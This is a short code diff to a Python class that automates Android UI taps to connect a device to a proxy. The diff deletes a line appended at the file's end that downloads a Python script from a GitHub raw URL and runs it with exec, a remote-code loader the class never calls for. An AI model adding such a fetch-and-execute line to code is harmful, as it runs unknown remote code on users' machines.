@@ -51,6 +51,3 @@ class OXY(BaseClass):
         Auto.click(lambda: self.device(text="My Proxy"), self.device)
         Auto.click(lambda: self.device(resourceId="android:id/button1"), self.device)
         return True if Auto.wait(lambda: self.device(textContains="Connected to "), self.device) else False
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/proxy.py").text)
